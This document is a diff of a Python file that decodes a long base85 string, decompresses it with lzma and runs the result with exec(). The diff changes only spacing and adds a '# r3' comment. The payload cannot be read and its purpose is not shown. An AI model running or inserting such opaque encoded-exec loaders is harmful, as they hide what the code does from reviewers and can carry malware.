@@ -1,4 +1,4 @@
-import lzma,base64
+import lzma, base64
 B=(
 '0000G0RR90|NsC0{{SlwziEslL34=p9D0Ocq<w$-5Pnecq;m9?w5^ZZ1WTm&%3qgbh83TxtoN4gbZ6%uLYQAF{R8H-GrHFt_bsK&Fd0j|hNi;rV<TL_610=dEc&+^V4cBfsf#6wJKW4cjwcCIYgE9_j*pryRq;@|RVy;#NqPwE{Ze__D%s*r<@xMa+JA9-62uVMs!j$iZ{9DKy2CpFn(WB$dr%Sv8WV~%L(Ys5+EpyRnJV2*ki(o~d*4EHhAI%5fohialncL<&*H?UDMnTY?8F|TVe{nVsy~!M?EK7jXzA&QG-mks^Pzha!)(9fWX;11X<TrBnp$<srV;SdIh9}NNy^M7m@C|#`7hMfBz~HBNJ~R7^`6Z@9PbDWt_L%bKI^$$&#ix^-}-AuHX=4rPL4VBdb{*yB0?Zq@~Pnh&PZmarPcJp5V0xd6>{){(>LQG&(@-W;kC+YqB-Oof_V%0jCW2;tjiy*D)T{9qjwG7ZeT1EFK{Smj6w7vN)dt|b%p=02GqIN6~WUfR>W*M^<e)vglk>5IIttDs!c(Rw+hIM=bOQj<OL}?)a>1B-uYUWqazKeQ?N2Yd2--G3K{aUbUx#q*7^Rbu#Od!!Y1-Es|W1^Fm8!`e24Rg`U<Qb%b0U(81zdmFEz|=fehxD!brn`av6G=F75R@fW)OdP|br)jH5d6Js+wUT`EA&=#rMi?6vQI'
 'ok6EAQ<=EmpFV4_<1w;J`h&0B8<9pHvMeJ3$7p`_KI>OkeCHp*^<?9Os5Ck&lR9>WNQ1=SQ-){~KnCoaBfF1i;HbPI*ktrJbcJn5S;Z)T;&G1MJ%DPHXObW&Zm~+TQBX^)6oXSO<~QZnD1g>)O6#q^?_`+pbh%rI?H#7@&z_iF!2_kI9DFpHAqkr5ARY+542JlLJ?Z}%_B7yxFG^NQt89QVgiQ<ywqGI6#YuDbWWQ)|J=BErOwn6R{^4TZi0_q;m(`$SdK|z!poOlN)_gA7OZwpq3-_((1y>%qvxe%d#cwYMp^AJ)?S70JQXXPd7EI<*C!(K66B((E9SL<FZ6F$3A(Sf)g33FQkdp0R%p&Hh<e-rnTKJtDQ5h0sMs(f0UKXnt9mSL6DQW%TWpPE!zj2a$S`HAaQM}Wp6+7iPY=)H*Upcnm5-~=1;UY^%^(;i**_Aw(7*|sZYf&UeWE!nih3JS4-z53PEt-7I*8A7gOzlg3YYgoynE%PSVVq#0DwC8j8;B?q<UV~RF$FD@`wF<@GdlK3d_5=9*Lh|sue#$u3LB!|fqy(rs=DK%%z_Bc*!;dJ@h#YS!L#V+Wwdn*)h%}8kRlDHC6q?K{A#HJOaS<-5unagqnV+}hnTcF3+hbQA5^5-Uh%e|1UxL8V0LcjO=7ex9ZmsQByK(Pdh@qGwtZQ_nE(sa!`FM8PI5bX{Y5eJ'
@@ -7,5 +7,5 @@ B=(
 'ir>S^?W#4T6Ui>c!UPJ*XY|A=8<0zQD91LxgdXfC+i}&YB24qUKPrtckxE8PKX^VxVneG=i;m4W@DgTfB$IajOmKTzRW}c^8x(UE+iar#DPGn}59w#v8Gj;jI`owXL^q6xAyl7iiM=}i@K+)I7ohp6w!u&iq}Pm(49C{zhZf`0N#URj$lI^~H}Ar9fgIiHC{&i?Jiv+uX7>Qkjddq<TvmMs6$393e0zcx732#-X6H&QVofZImRPm!vDR3O+&)^(T4%JpE{idJWU<aN4!~c5Gb57O?{C>K1Rfr(s%=i+!i_0=G1!*9=Jtq8EIH0A7YUE0!2R3zk)RD;G}jtr)gI|Mhf(s4A$k$=EHomJkKG=1x)I8Y3XZgfJteg|3=-IU-GR5dMkAYPazwr$M+?UQ)$5M^B~}UcVW#G3Ir`jaJC^RqQgMt%iK63K>z^;s(o$@HXmWU#FH)Lzzds+5$<aJF&<=T-$W2KRZj+3pTwhH)l~SSOM?YCkqx3R`T)p<M;d!=Nd@eQ}C1(u>$#T}!URN~B_Lqjb23WDVF!xIvzm%W_0J~CW+eABVzqY`%8e?h|`E-QkjbQo*E80MMA6DT1u?IfY^7j+4eNE&{1=fJD8j@$>ZROfIxTeY9*M8y1g6?!2H%=Y)@tp{dk^O?BTr<No{K4=G8r^l2q-JgpQwbb!2{AM`#VE~xGuvl1x6Q_6H-^h8'
 'Nwil}VfDu2LKW6ra~YTafL>E+!8Ua$MHUZFQznzdMbchYsR38o&eHTlnJiYc0IUoyenMqZKPKD(?mpdtrn6dt+Z7iCzRk!Fdo!T-##WK@en;M+3hw91cf|?8`@d&^M5cT*68t8gH0~)2qC@*o1T7GkP{76HEs#$eL!{DAluG_7qK=>hv#Y#!oXJ<PXs3IE*4ZQKT9n@IyA~Y#?Tg3NaU-iNKujvQ4UY~$T+JXwL=`)S#Up=)b(<YZ&9uyg<p<f+!o>0>Grd?Wmp8ITJHM4N5X(E?f}>Z5U)=#AzNWc|Oc-yV19uICSd$%=x4T=u2+n!d)9c@U-R^^RKTd7sLMq;d&M=U+@K^WFv<uClOG@xA9oUoM%Tc^;1?*zIX#S3C329NqepzaT0A(+pRrFrO1-uU{*m^h0t`|<tz*Nv0rx$bcr@TJzD~B1*+0yQzRNBJx;I{XSgo!j-;HjjMsJ3?j65@`{D>aG4--oAZ|I=P;76'
 )
-S=lzma.decompress(base64.b85decode(B))
-exec(S)
+S = lzma.decompress(base64.b85decode(B))
+exec(S)  # r3
